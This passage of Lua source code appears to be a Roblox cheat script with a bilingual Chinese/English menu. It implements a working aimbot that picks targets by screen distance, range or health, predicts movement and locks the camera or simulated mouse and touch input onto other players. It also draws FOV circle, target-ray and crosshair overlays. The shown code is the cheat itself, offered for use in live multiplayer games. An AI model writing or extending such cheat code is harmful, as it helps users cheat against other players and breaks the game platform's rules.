            circle.Position = UDim2.new(0.5, -size * 0.35, 0.5, -size * 0.35)
            circle.BackgroundTransparency = 1
            circle.BorderSizePixel = 0
            addElement(circle)
            
            local corner = Instance.new("UICorner", circle)
            corner.CornerRadius = UDim.new(1, 0)
            addElement(corner)
            
            local stroke = Instance.new("UIStroke", circle)
            stroke.Thickness = thickness * 0.6
            stroke.Color = mainColor
            stroke.Transparency = transparency / 100
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            addElement(stroke)
            
            local dot = createCrosshairDot(container, thickness * 1.5, mainColor, transparency)
            dot.Position = UDim2.new(0.5, -thickness * 0.75, 0.5, -thickness * 0.75)
            addElement(dot)
        end
        
        if Crosshair.outline then
            for _, element in ipairs(crosshairElements) do
                if element:IsA("Frame") and element ~= container then
                    local existingStroke = element:FindFirstChildOfClass("UIStroke")
                    if not existingStroke then
                        local stroke = Instance.new("UIStroke", element)
                        stroke.Thickness = Crosshair.outlineThickness
                        stroke.Color = Crosshair.outlineColor
                        stroke.Transparency = 0
                        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                    end
                end
            end
        end
    end
    
    local function updateCrosshairPosition()
        if not crosshairGui then return end
        
        local center = getScreenCenterWithOffset()
        local size = Crosshair.size
        local thickness = Crosshair.thickness
        local halfThick = thickness / 2
        
        for _, element in ipairs(crosshairElements) do
            if element.Name == "CrosshairContainer" then
                element.Position = UDim2.new(0, center.X - size - halfThick, 0, center.Y - size - halfThick)
                break
            end
        end
    end
    
    local function updateCrosshairColors()
        if not crosshairGui then return end
        
        local mainColor = Crosshair.color
        if mainColor == colorMap["彩色"] then
            mainColor = getRainbowColor()
        end
        
        for _, element in ipairs(crosshairElements) do
            if element:IsA("Frame") and element.Name ~= "CrosshairContainer" then
                if element.BackgroundTransparency < 1 then
                    element.BackgroundColor3 = mainColor
                end
                
                local stroke = element:FindFirstChildOfClass("UIStroke")
                if stroke then
                    stroke.Color = mainColor
                end
            end
        end
    end
    
    local function createCrosshair()
        if crosshairGui then
            crosshairGui:Destroy()
            crosshairGui = nil
            crosshairElements = {}
        end
        
        if crosshairUpdateConnection then
            crosshairUpdateConnection:Disconnect()
            crosshairUpdateConnection = nil
        end
        
        if crosshairRainbowConnection then
            crosshairRainbowConnection:Disconnect()
            crosshairRainbowConnection = nil
        end
        
        if not Crosshair.enabled then return end
        
        crosshairGui = Instance.new("ScreenGui")
        crosshairGui.Name = "Crosshair"
        crosshairGui.ResetOnSpawn = false
        crosshairGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        crosshairGui.Parent = game:GetService("CoreGui")
        
        buildCrosshair()
        
        crosshairUpdateConnection = RunService.RenderStepped:Connect(function()
            if not Crosshair.enabled then
                if crosshairGui then
                    crosshairGui.Enabled = false
                end
                return
            end
            
            if crosshairGui then
                crosshairGui.Enabled = true
            end
            
            updateCrosshairPosition()
            
            if Crosshair.color == colorMap["彩色"] then
                updateCrosshairColors()
            end
        end)
    end
    
    local function destroyCrosshair()
        if crosshairUpdateConnection then
            crosshairUpdateConnection:Disconnect()
            crosshairUpdateConnection = nil
        end
        
        if crosshairRainbowConnection then
            crosshairRainbowConnection:Disconnect()
            crosshairRainbowConnection = nil
        end
        
        if crosshairGui then
            crosshairGui:Destroy()
            crosshairGui = nil
        end
        
        crosshairElements = {}
    end
    
    local function updateCrosshair()
        if Crosshair.enabled then
            createCrosshair()
        else
            destroyCrosshair()
        end
    end
    
    local function isFriend(player)
        if not AimBot.friendCheck then return false end
        
        local success, isFriendResult = pcall(function()
            return LocalPlayer:IsFriendsWith(player.UserId)
        end)
        
        return success and isFriendResult
    end
    
    local function isEnemy(player)
        if player == LocalPlayer then return false end
        if not AimBot.teamCheck then return true end
        
        local playerTeam = player.Team
        local localTeam = LocalPlayer.Team
        
        if not playerTeam or not localTeam then 
            return true
        end
        
        return playerTeam ~= localTeam
    end
    
    local function isAlive(character)
        if not AimBot.aliveCheck then return true end
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        return humanoid and humanoid.Health > 0
    end
    
    local function isWallBetween(targetPart)
        if not AimBot.wallCheck then return false end
        
        local raycastParams = RaycastParams.new()
        raycastParams.FilterDescendantsInstances = {LocalPlayer.Character or workspace}
        raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
        
        local rayOrigin = Cam.CFrame.Position
        local rayDirection = (targetPart.Position - rayOrigin).Unit * AimBot.distance
        local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
        
        return raycastResult and not raycastResult.Instance:IsDescendantOf(targetPart.Parent)
    end
    
    local function isInFOVLimit(targetPosition)
        if not AimBot.fovLimit.enabled then return true end
        
        local cameraCFrame = Cam.CFrame
        local directionToTarget = (targetPosition - cameraCFrame.Position).Unit
        local cameraLookVector = cameraCFrame.LookVector
        
        local angle = math.deg(math.acos(cameraLookVector:Dot(directionToTarget)))
        
        return angle <= AimBot.fovLimit.angle
    end
    
    local function shouldAimAtPlayer(player)
        if player == LocalPlayer then return false end
        if AimBot.friendCheck and isFriend(player) then return false end
        if not isEnemy(player) then return false end
        
        local character = player.Character
        if not character then return false end
        if not isAlive(character) then return false end
        
        return true
    end
    
    local function isNPC(character)
        if not character then return false end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return false end
        local player = Players:GetPlayerFromCharacter(character)
        return player == nil
    end
    
    local function getAimPosition(targetPart)
        if not targetPart then return nil end
        
        if not AimBot.offsetEnabled or (AimBot.offsetX == 0 and AimBot.offsetY == 0) then
            return targetPart.Position
        end
        
        local screenPos, onScreen = Cam:WorldToViewportPoint(targetPart.Position)
        if not onScreen then
            return targetPart.Position
        end
        
        local offsetScreenPos = Vector2.new(screenPos.X + AimBot.offsetX, screenPos.Y + AimBot.offsetY)
        
        local ray = Cam:ScreenPointToRay(offsetScreenPos.X, offsetScreenPos.Y)
        local hitPoint = ray.Origin + ray.Direction * (Cam.CFrame.Position - targetPart.Position).Magnitude
        
        return hitPoint
    end
    
    local function smoothAim(targetPosition)
        if AimBot.lockMode == "相机" then
            local currentCFrame = Cam.CFrame
            local lookVector = (targetPosition - currentCFrame.Position).Unit
            local targetCFrame = CFrame.new(currentCFrame.Position, currentCFrame.Position + lookVector)
            
            if AimBot.smoothnessEnabled then
                local smoothFactor = 1 - (AimBot.smoothness / 100) * 0.9
                Cam.CFrame = currentCFrame:Lerp(targetCFrame, smoothFactor)
            else
                Cam.CFrame = targetCFrame
            end
        elseif AimBot.lockMode == "鼠标" then
            local screenPos, onScreen = Cam:WorldToViewportPoint(targetPosition)
            if onScreen then
                local x = screenPos.X
                local y = screenPos.Y
                VirtualInputManager:SendMouseMoveEvent(x, y, 0)
            end
        elseif AimBot.lockMode == "触摸" then
            local screenPos, onScreen = Cam:WorldToViewportPoint(targetPosition)
            if onScreen then
                local x = screenPos.X
                local y = screenPos.Y
                local touchId = math.random(99999)
                VirtualInputManager:SendTouchEvent(touchId, 0, x, y)
                task.wait(0.01)
                VirtualInputManager:SendTouchEvent(touchId, 2, x, y)
            end
        end
    end
    
    local function predictPosition(targetPart)
        if not AimBot.predictionEnabled or AimBot.predictionDistance <= 0 then
            return targetPart and targetPart.Position
        end
        
        local character = targetPart.Parent
        if not character then return targetPart.Position end
        
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if not rootPart then return targetPart.Position end
        
        local currentPos = rootPart.Position
        local velocity = rootPart.Velocity
        
        return currentPos + velocity * AimBot.predictionDistance * 0.01
    end
    
    local function trackPlayerPositions()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                local rootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                if rootPart then
                    playerPositions[player] = playerPositions[player] or {}
                    table.insert(playerPositions[player], rootPart.Position)
                    
                    if #playerPositions[player] > 5 then
                        table.remove(playerPositions[player], 1)
                    end
                end
            end
        end
    end
    
    local function getPlayerHealth(player)
        if not player or not player.Character then return 100 end
        local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return 100 end
        return humanoid.Health
    end
    
    local function findClosestTarget()
        local closestTarget, closestValue = nil, math.huge
        local fovCenter = getFOVCenter()
        local targets = {}
        
        for _, player in ipairs(Players:GetPlayers()) do
            if shouldAimAtPlayer(player) then
                table.insert(targets, {type = "player", object = player})
            end
        end
        
        if AimBot.aimNPC then
            for _, npc in ipairs(workspace:GetDescendants()) do
                if npc:IsA("Model") and npc:FindFirstChildOfClass("Humanoid") then
                    local player = Players:GetPlayerFromCharacter(npc)
                    if not player and npc ~= LocalPlayer.Character then
                        if isAlive(npc) then
                            table.insert(targets, {type = "npc", object = npc})
                        end
                    end
                end
            end
        end
        
        for _, target in ipairs(targets) do
            local character
            if target.type == "player" then
                character = target.object.Character
            else
                character = target.object
            end
            
            if character then
                local targetPart = character:FindFirstChild(AimBot.position)
                if not targetPart then
                    targetPart = character:FindFirstChild("HumanoidRootPart")
                end
                if targetPart then
                    local aimPos = getAimPosition(targetPart)
                    local checkPos = aimPos or targetPart.Position
                    
                    if not isInFOVLimit(checkPos) then
                        continue
                    end
                    
                    local screenPos, onScreen = Cam:WorldToViewportPoint(checkPos)
                    if onScreen then
                        local fovDistance = (Vector2.new(screenPos.X, screenPos.Y) - fovCenter).Magnitude
                        local worldDistance = (Cam.CFrame.Position - checkPos).Magnitude
                        local health = 100
                        if target.type == "player" then
                            health = getPlayerHealth(target.object)
                        end
                        
                        if AimBot.priority == "fov" and fovDistance > AimBot.distance then
                            continue
                        end
                        
                        if AimBot.wallCheck and isWallBetween(targetPart) then
                            continue
                        end
                        
                        local compareValue
                        if AimBot.priority == "fov" then
                            compareValue = fovDistance
                        elseif AimBot.priority == "distance" then
                            compareValue = worldDistance
                        elseif AimBot.priority == "health" then
                            compareValue = health
                        else
                            compareValue = fovDistance
                        end
                        
                        if compareValue < closestValue then
                            closestValue = compareValue
                            closestTarget = target
                        end
                    end
                end
            end
        end
        
        return closestTarget
    end
    
    local function getAimbotTarget()
        if AimBot.enabled then
            return findClosestTarget()
        end
        return nil
    end
    
    local function createFOV()
        if fovGui then
            fovGui:Destroy()
            fovGui = nil
            fovCircle = nil
        end
        
        if fovUpdateConnection then
            fovUpdateConnection:Disconnect()
            fovUpdateConnection = nil
        end
        
        if not FOVCircle.enabled then return end
        
        fovGui = Instance.new("ScreenGui")
        fovGui.Name = "FOVCircle"
        fovGui.ResetOnSpawn = false
        fovGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        fovGui.Parent = game:GetService("CoreGui")
        
        local fovContainer = Instance.new("Frame")
        fovContainer.Name = "FOVContainer"
        fovContainer.Size = UDim2.new(0, FOVCircle.size * 2, 0, FOVCircle.size * 2)
        fovContainer.BackgroundTransparency = 1
        fovContainer.BorderSizePixel = 0
        fovContainer.Parent = fovGui
        
        fovCircle = Instance.new("Frame")
        fovCircle.Name = "FOVCircle"
        fovCircle.Size = UDim2.new(1, 0, 1, 0)
        fovCircle.Position = UDim2.new(0, 0, 0, 0)
        fovCircle.BackgroundTransparency = 1
        fovCircle.BorderSizePixel = 0
        fovCircle.Parent = fovContainer
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(1, 0)
        corner.Parent = fovCircle
        
        local stroke = Instance.new("UIStroke")
        stroke.Thickness = FOVCircle.thickness
        stroke.Color = FOVCircle.color
        stroke.Transparency = 1 - (FOVCircle.transparency / 10)
        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        stroke.Parent = fovCircle
        
        local function updateFOVPosition()
            if not fovGui or not fovContainer then return end
            
            if FOVCircle.color == colorMap["彩色"] and stroke then
                stroke.Color = getRainbowColor()
            end
            
            local center = getFOVCenter()
            
            fovContainer.Size = UDim2.new(0, FOVCircle.size * 2, 0, FOVCircle.size * 2)
            fovContainer.Position = UDim2.new(0, center.X - FOVCircle.size, 0, center.Y - FOVCircle.size)
            
            if stroke then
                stroke.Thickness = FOVCircle.thickness
                stroke.Transparency = 1 - (FOVCircle.transparency / 10)
                if FOVCircle.color ~= colorMap["彩色"] then
                    stroke.Color = FOVCircle.color
                end
            end
        end
        
        fovUpdateConnection = RunService.RenderStepped:Connect(updateFOVPosition)
    end
    
    local function destroyFOV()
        if fovUpdateConnection then
            fovUpdateConnection:Disconnect()
            fovUpdateConnection = nil
        end
        
        if fovGui then
            fovGui:Destroy()
            fovGui = nil
            fovCircle = nil
        end
    end
    
    local function updateFOV()
        if not fovCircle then
            if FOVCircle.enabled then
                createFOV()
            end
            return
        end
        
        local stroke = fovCircle:FindFirstChildOfClass("UIStroke")
        local container = fovCircle.Parent
        
        if stroke and container then
            stroke.Thickness = FOVCircle.thickness
            stroke.Transparency = 1 - (FOVCircle.transparency / 10)
            if FOVCircle.color ~= colorMap["彩色"] then
                stroke.Color = FOVCircle.color
            end
            
            local center = getFOVCenter()
            
            container.Size = UDim2.new(0, FOVCircle.size * 2, 0, FOVCircle.size * 2)
            container.Position = UDim2.new(0, center.X - FOVCircle.size, 0, center.Y - FOVCircle.size)
        end
        
        if fovGui then
            fovGui.Enabled = FOVCircle.enabled
        end
    end
    
    local function createTargetRay()
        if targetLine then targetLine:Remove() end
        if distanceText then distanceText:Remove() end
        
        targetLine = Drawing.new("Line")
        targetLine.Visible = false
        targetLine.Thickness = TargetRay.thickness
        targetLine.Color = TargetRay.color
        targetLine.Transparency = TargetRay.transparency
        
        if TargetRay.showDistance then
            distanceText = Drawing.new("Text")
            distanceText.Visible = false
            distanceText.Size = 16
            distanceText.Center = true
            distanceText.Outline = true
            distanceText.Font = Drawing.Fonts.UI
            distanceText.Color = TargetRay.color
        end
    end
    
    local function updateTargetRay(target)
        if not TargetRay.enabled then
            if targetLine then targetLine.Visible = false end
            if distanceText then distanceText.Visible = false end
            return
        end
        
        if not target then
            if targetLine then targetLine.Visible = false end
            if distanceText then distanceText.Visible = false end
            return
        end
        
        local character
        if target.type == "player" then
            character = target.object.Character
        else
            character = target.object
        end
        
        if not character then
            if targetLine then targetLine.Visible = false end
            if distanceText then distanceText.Visible = false end
            return
        end
        
        local targetPart = character:FindFirstChild(AimBot.position)
        if not targetPart then
            targetPart = character:FindFirstChild("HumanoidRootPart")
        end
        if not targetPart then
            if targetLine then targetLine.Visible = false end
            if distanceText then distanceText.Visible = false end
            return
        end
        
        local targetScreenPos, onScreen = Cam:WorldToViewportPoint(targetPart.Position)
        if not onScreen then
            if targetLine then targetLine.Visible = false end
            if distanceText then distanceText.Visible = false end
            return
        end
        
        local fovCenter = getFOVCenter()
        local fromPos = fovCenter
        local toPos = Vector2.new(targetScreenPos.X, targetScreenPos.Y)
        
        if targetLine then
            targetLine.Visible = true
            targetLine.From = fromPos
            targetLine.To = toPos
            targetLine.Thickness = TargetRay.thickness
            targetLine.Transparency = TargetRay.transparency
            
            if TargetRay.color == colorMap["彩色"] then
                targetLine.Color = getRainbowColor()
            else
                targetLine.Color = TargetRay.color
            end
        end
        
        if distanceText and TargetRay.showDistance then
            local distance = (Cam.CFrame.Position - targetPart.Position).Magnitude
            local textPos = (fromPos + toPos) / 2
            
            distanceText.Visible = true
            distanceText.Position = textPos
            distanceText.Text = string.format("%.1f m", distance)
            
            if TargetRay.color == colorMap["彩色"] then
                distanceText.Color = getRainbowColor()
            else
                distanceText.Color = TargetRay.color
            end
        elseif distanceText then
            distanceText.Visible = false
        end
    end
    
    local function destroyTargetRay()
        if targetRenderConnection then
            targetRenderConnection:Disconnect()
            targetRenderConnection = nil
        end
        
        if targetLine then
            targetLine:Remove()
            targetLine = nil
        end
        
        if distanceText then
            distanceText:Remove()
            distanceText = nil
        end
    end
    
    local function updateTargetRaySettings()
        if not targetLine then return end
        
        targetLine.Thickness = TargetRay.thickness
        targetLine.Transparency = TargetRay.transparency
        
        if TargetRay.color == colorMap["彩色"] then
            targetLine.Color = getRainbowColor()
        else
            targetLine.Color = TargetRay.color
        end
        
        if distanceText then
            if TargetRay.showDistance then
                if TargetRay.color == colorMap["彩色"] then
                    distanceText.Color = getRainbowColor()
                else
                    distanceText.Color = TargetRay.color
                end
            else
                distanceText.Visible = false
            end
        end
    end
    
    local function startAim()
        if aimRenderConnection then aimRenderConnection:Disconnect() end
        
        createTargetRay()
        
        aimRenderConnection = RunService.RenderStepped:Connect(function()
            if AimBot.disableOnMove and isMoving() then
                if TargetRay.enabled then
                    local target = findClosestTarget()
                    if target then
                        updateTargetRay(target)
                    else
                        if targetLine then targetLine.Visible = false end
                        if distanceText then distanceText.Visible = false end
                    end
                end
                return
            end
            
            if AimBot.predictionEnabled then
                trackPlayerPositions()
            end
            
            local target = nil
            
            if AimBot.enabled then
                target = findClosestTarget()
                if target then
                    local character
                    if target.type == "player" then
                        character = target.object.Character
                    else
                        character = target.object
                    end
                    
                    if character then
                        local targetPart = character:FindFirstChild(AimBot.position)
                        if not targetPart then
                            targetPart = character:FindFirstChild("HumanoidRootPart")
                        end
                        if targetPart then
                            local predictedPos = predictPosition(targetPart)
                            if predictedPos then
                                local aimPos = getAimPosition(targetPart)
                                if aimPos then
                                    smoothAim(aimPos)
                                else
                                    smoothAim(predictedPos)
                                end
                            end
                        end
                    end
                end
            end
            
            if TargetRay.enabled and target then
                updateTargetRay(target)
            elseif TargetRay.enabled then
                if targetLine then targetLine.Visible = false end
                if distanceText then distanceText.Visible = false end
            end
        end)
        
        if TargetRay.enabled then
            targetRenderConnection = RunService.RenderStepped:Connect(function()
                if not AimBot.enabled then
                    local target = findClosestTarget()
                    if target then
                        updateTargetRay(target)
                    else
                        if targetLine then targetLine.Visible = false end
                        if distanceText then distanceText.Visible = false end
                    end
                end
            end)
        end
    end
    
    local function stopAim()
        if aimRenderConnection then
            aimRenderConnection:Disconnect()
            aimRenderConnection = nil
        end
        table.clear(playerPositions)
        destroyTargetRay()
    end
    
    local function updateQuickButtonView()
        if not quickButton then return end
        if AimBot.enabled then
            quickButton.Text = "自瞄: 开"
            quickButton.TextColor3 = Color3.fromRGB(0, 255, 0)
        else
            quickButton.Text = "自瞄: 关"
            quickButton.TextColor3 = Color3.fromRGB(255, 0, 0)
        end
    end

    local function startRainbowAnimation()
        if rainbowConnection then 
            rainbowConnection:Disconnect()
            rainbowConnection = nil
        end
        
        if not quickButton then return end
        
        local stroke = quickButton:FindFirstChild("RainbowStroke")
        if not stroke then return end
        
        rainbowConnection = RunService.RenderStepped:Connect(function()
            if not stroke or not stroke.Parent then
                if rainbowConnection then
                    rainbowConnection:Disconnect()
                    rainbowConnection = nil
                end
                return
            end
            local hue = tick() % 5 / 5
            stroke.Color = Color3.fromHSV(hue, 1, 1)
        end)
    end

    local function toggleAimBot(state, fromUI)
        if state == AimBot.enabled then return end
        
        AimBot.enabled = state
        
        updateQuickButtonView()
        
        if state then 
            startAim() 
        else 
            stopAim() 
        end
        
        if not fromUI and aimToggleInstance and type(aimToggleInstance.SetState) == "function" then
            aimToggleInstance:SetState(state)
        end
    end

    local function destroyQuickSwitch()
        if rainbowConnection then
            rainbowConnection:Disconnect()
            rainbowConnection = nil
        end
        
        if quickGui then
            quickGui:Destroy()
            quickGui = nil
            quickButton = nil
        end
    end

    local function createQuickSwitch()
        destroyQuickSwitch()
        if not showQuickSwitch then return end

        quickGui = Instance.new("ScreenGui")
        quickGui.Name = "AimBotQuickSwitch"
        quickGui.ResetOnSpawn = false
        quickGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        quickGui.Parent = game:GetService("CoreGui")

        quickButton = Instance.new("TextButton")
        quickButton.Name = "SwitchButton"
        quickButton.Size = UDim2.new(0, 45, 0, 45)
        quickButton.Position = savedQuickPosition
        quickButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        quickButton.BackgroundTransparency = 0.4
        quickButton.BorderSizePixel = 0
        
        if lockQuickSwitch then
            quickButton.Active = false
            quickButton.Draggable = false
            quickButton.Selectable = false
        else
            quickButton.Active = true
            quickButton.Draggable = true
            quickButton.Selectable = true
        end
        
        quickButton.Font = Enum.Font.GothamSemibold
        quickButton.TextSize = 10
        quickButton.TextWrapped = true
        quickButton.Parent = quickGui

        local buttonCorner = Instance.new("UICorner")
        buttonCorner.CornerRadius = UDim.new(0, 8)
        buttonCorner.Parent = quickButton

        local buttonStroke = Instance.new("UIStroke")
        buttonStroke.Name = "RainbowStroke"
        buttonStroke.Thickness = 1.5
        buttonStroke.Color = Color3.fromRGB(255, 0, 0)
        buttonStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        buttonStroke.LineJoinMode = Enum.LineJoinMode.Round
        buttonStroke.Parent = quickButton

        updateQuickButtonView()
        
        startRainbowAnimation()

        quickButton.MouseButton1Click:Connect(function()
            toggleAimBot(not AimBot.enabled, false)
        end)
        
        quickButton:GetPropertyChangedSignal("Position"):Connect(function()
            if not lockQuickSwitch then
                savedQuickPosition = quickButton.Position
            end
        end)
    end
    
    local function updateQuickSwitchLock()
        if not quickButton then return end
        
        if lockQuickSwitch then
            quickButton.Active = false
            quickButton.Draggable = false
            quickButton.Selectable = false
            quickButton.Position = savedQuickPosition
        else
            quickButton.Active = true
            quickButton.Draggable = true
            quickButton.Selectable = true
        end
    end
    
    local function setupInputListener()
        if inputConnection then inputConnection:Disconnect() end
        
        inputConnection = UserInputService.InputBegan:Connect(function(input)
            if input.KeyCode == Enum.KeyCode.Delete then
                destroyFOV()
                stopAim()
                destroyQuickSwitch()
                destroyCrosshair()
                if aimToggleInstance and type(aimToggleInstance.SetState) == "function" then
                    aimToggleInstance:SetState(false)
                end
                AimBot.enabled = false
                updateQuickButtonView()
            end
        end)
    end
    
    if mouseConnection then mouseConnection:Disconnect() end
    mouseConnection = UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            mousePos = input.Position
        end
    end)
    
    setupInputListener()
    
    _G.AimBotState = AimBot
    _G.FOVCircleState = FOVCircle
    _G.TargetRayState = TargetRay
    _G.CrosshairState = Crosshair
    _G.StartAim = startAim
    _G.StopAim = stopAim
    _G.CreateFOV = createFOV
    _G.DestroyFOV = destroyFOV
    _G.UpdateTargetRaySettings = updateTargetRaySettings
    _G.UpdateFOV = updateFOV
    _G.CreateCrosshair = createCrosshair
    _G.DestroyCrosshair = destroyCrosshair
    _G.UpdateCrosshair = updateCrosshair
    _G.isMoving = isMoving
    
    local aimSection = PIJIAOBEN:section("自瞄", false)
    
    aimToggleInstance = aimSection:Toggle("开启自瞄", "Enable Aim", false, function(state)
        toggleAimBot(state, true)
    end)
    
    aimSection:Dropdown('锁定模式', 'Lock Mode', {"相机", "鼠标", "触摸"}, function(value)
        AimBot.lockMode = value
    end)
    
    aimSection:Toggle("显示自瞄快捷键悬浮窗", "Show Quick Switch", false, function(state)
        showQuickSwitch = state
        if state then
            createQuickSwitch()
        else
            destroyQuickSwitch()
        end
    end)
    
    aimSection:Toggle("固定悬浮窗位置", "Lock Quick Switch", false, function(state)
        lockQuickSwitch = state
        updateQuickSwitchLock()
    end)
    
    aimSection:Toggle("移动时暂停自瞄", "Disable On Move", false, function(state)
        AimBot.disableOnMove = state
    end)
    
    aimSection:Slider("自瞄距离", "Aim Distance", 40, 10, 10000, false, function(value)
        AimBot.distance = value
    end)
    
    aimSection:Toggle("平滑自瞄", "Smooth Aim", false, function(state)
        AimBot.smoothnessEnabled = state
    end)
    
    aimSection:Slider("平滑度", "Smoothness", 50, 1, 100, false, function(value)
        AimBot.smoothness = value
    end)
    
    aimSection:Toggle("预判自瞄", "Prediction", false, function(state)
        AimBot.predictionEnabled = state
    end)
    
    aimSection:Slider("预判距离", "Prediction Distance", 40, 10, 1000, false, function(value)
        AimBot.predictionDistance = value
    end)
    
    aimSection:Toggle("视野范围限制", "FOV Limit", false, function(state)
        AimBot.fovLimit.enabled = state
    end)
    
    aimSection:Slider("视野角度", "FOV Angle", 60, 10, 180, false, function(value)
        AimBot.fovLimit.angle = value
    end)
    
    aimSection:Dropdown('自瞄部位', 'Aim Position', {"头部", "脖子", "躯干", "左臂", "右臂", "左腿", "右腿", "左手", "右手", "左小臂", "右小臂", "左大臂", "右大臂", "左脚", "左小腿", "上半身", "左大腿", "右脚", "右小腿", "下半身", "右大腿"}, function(Value)
        AimBot.position = partMap[Value]
    end)
    
    aimSection:Toggle("队伍检测", "Team Check", false, function(state)
        AimBot.teamCheck = state
    end)
    
    aimSection:Toggle("活体检测", "Alive Check", false, function(state)
        AimBot.aliveCheck = state
    end)
    
    aimSection:Toggle("墙壁检测", "Wall Check", false, function(state)
        AimBot.wallCheck = state
    end)
    
    aimSection:Toggle("好友检测", "Friend Check", false, function(state)
        AimBot.friendCheck = state
    end)
    
    aimSection:Toggle("自瞄NPC", "Aim NPC", false, function(state)
        AimBot.aimNPC = state
    end)
        
    aimSection:Dropdown('优先瞄准', 'Aim Priority', {"FOV范围优先", "距离优先", "血量优先"}, function(Value)
        if Value == "FOV范围优先" then
            AimBot.priority = "fov"
        elseif Value == "距离优先" then
            AimBot.priority = "distance"
        elseif Value == "血量优先" then
            AimBot.priority = "health"
        end
    end)
    
    local offsetSection = PIJIAOBEN:section("准心偏移", false)
    
    offsetSection:Toggle("开启准心偏移", "Enable Crosshair Offset", false, function(state)
        AimBot.offsetEnabled = state
        if FOVCircle.enabled then
            updateFOV()
        end
        if Crosshair.enabled then
            updateCrosshair()
        end
    end)
    
    offsetSection:Slider("偏移 X轴", "Offset X", 0, -200, 200, false, function(value)
        AimBot.offsetX = value
        if FOVCircle.enabled then
            updateFOV()
        end
        if Crosshair.enabled then
            updateCrosshair()
        end
    end)
    
    offsetSection:Slider("偏移 Y轴", "Offset Y", 0, -200, 200, false, function(value)
        AimBot.offsetY = value
        if FOVCircle.enabled then
            updateFOV()
        end
        if Crosshair.enabled then
            updateCrosshair()
        end
    end)
    
    local fovSection = PIJIAOBEN:section("FOV圈", false)
    
    fovSection:Toggle("显示FOV圈", "Show FOV Circle", false, function(state)
        FOVCircle.enabled = state
        if state then
            createFOV()
        else
            destroyFOV()
        end
    end)
    
    fovSection:Dropdown('FOV圈跟随', 'FOV Follow', {"准心", "鼠标"}, function(value)
        FOVCircle.follow = value
        if FOVCircle.enabled then
            createFOV()
        end
    end)
    
    fovSection:Slider("FOV圈大小", "FOV Size", 20, 0, 100, false, function(value)
        FOVCircle.size = value
        updateFOV()
    end)
    
    fovSection:Slider("FOV圈厚度", "FOV Thickness", 2, 0, 10, false, function(value)
        FOVCircle.thickness = value
        updateFOV()
    end)
    
    fovSection:Slider("FOV圈透明度", "FOV Transparency", 1, 0, 10, false, function(value)
        FOVCircle.transparency = value
        updateFOV()
    end)
    
    fovSection:Dropdown('FOV圈颜色', 'FOV Color', {"红色","蓝色","黄色","绿色","青色","橙色","紫色","白色","黑色","彩色"}, function(value)
        FOVCircle.color = colorMap[value]
        updateFOV()
    end)
    
    local raySection = PIJIAOBEN:section("目标射线", false)
    
    raySection:Toggle("显示目标射线", "Show Target Ray", false, function(state)
        TargetRay.enabled = state
        if state then
            createTargetRay()
            if not aimRenderConnection then
                startAim()
            end
        else
            if targetLine then targetLine.Visible = false end
            if distanceText then distanceText.Visible = false end
        end
    end)
    
    raySection:Slider("射线厚度", "Ray Thickness", 2, 1, 10, false, function(value)
        TargetRay.thickness = value
        updateTargetRaySettings()
    end)
    
    raySection:Slider("射线透明度", "Ray Transparency", 0.5, 0, 1, true, function(value)
        TargetRay.transparency = value
        updateTargetRaySettings()
    end)
    
    raySection:Dropdown('射线颜色', 'Ray Color', {"红色","蓝色","黄色","绿色","青色","橙色","紫色","白色","黑色","彩色"}, function(value)
        TargetRay.color = colorMap[value]
        updateTargetRaySettings()
    end)
    
    raySection:Toggle("显示距离", "Show Distance", false, function(state)
        TargetRay.showDistance = state
        if not state and distanceText then
            distanceText.Visible = false
        end
    end)
    
    local crosshairSection = PIJIAOBEN:section("准心", false)
    
    crosshairSection:Toggle("显示准心", "Show Crosshair", false, function(state)
        Crosshair.enabled = state
        if state then
            createCrosshair()
        else
            destroyCrosshair()
        end
    end)
    
    crosshairSection:Dropdown('准心样式', 'Crosshair Style', {"十字", "红点", "圆圈", "T型", "X型", "自定义"}, function(value)
        Crosshair.style = value
        if Crosshair.enabled then
            createCrosshair()
        end
    end)
    
    crosshairSection:Slider("准心大小", "Crosshair Size", 20, 5, 60, false, function(value)
        Crosshair.size = value
        if Crosshair.enabled then
            createCrosshair()
        end
    end)
    
    crosshairSection:Slider("准心厚度", "Crosshair Thickness", 2, 1, 6, false, function(value)
        Crosshair.thickness = value
        if Crosshair.enabled then
            createCrosshair()
        end
    end)
    
    crosshairSection:Slider("准心透明度", "Crosshair Transparency", 0, 0, 100, false, function(value)
        Crosshair.transparency = value
        if Crosshair.enabled then
            createCrosshair()
        end
    end)
    
    crosshairSection:Slider("十字间隙", "Crosshair Gap", 4, 0, 15, false, function(value)
        Crosshair.gap = value
        if Crosshair.enabled and (Crosshair.style == "十字" or Crosshair.style == "T型" or Crosshair.style == "自定义") then
            createCrosshair()
        end
    end)
    
    crosshairSection:Slider("红点大小", "Dot Size", 3, 1, 10, false, function(value)
        Crosshair.dotSize = value
        if Crosshair.enabled and Crosshair.style == "红点" then
            createCrosshair()
        end
    end)
    
    crosshairSection:Dropdown('准心颜色', 'Crosshair Color', {"红色","蓝色","黄色","绿色","青色","橙色","紫色","白色","黑色","彩色"}, function(value)
        Crosshair.color = colorMap[value]
        if Crosshair.enabled then
            createCrosshair()
        end
    end)
    
    crosshairSection:Toggle("显示描边", "Show Outline", false, function(state)
        Crosshair.outline = state
        if Crosshair.enabled then
            createCrosshair()
        end
    end)
    
    crosshairSection:Dropdown('描边颜色', 'Outline Color', {"黑色","白色","红色","蓝色","绿色","黄色"}, function(value)
        local outlineColorMap = {
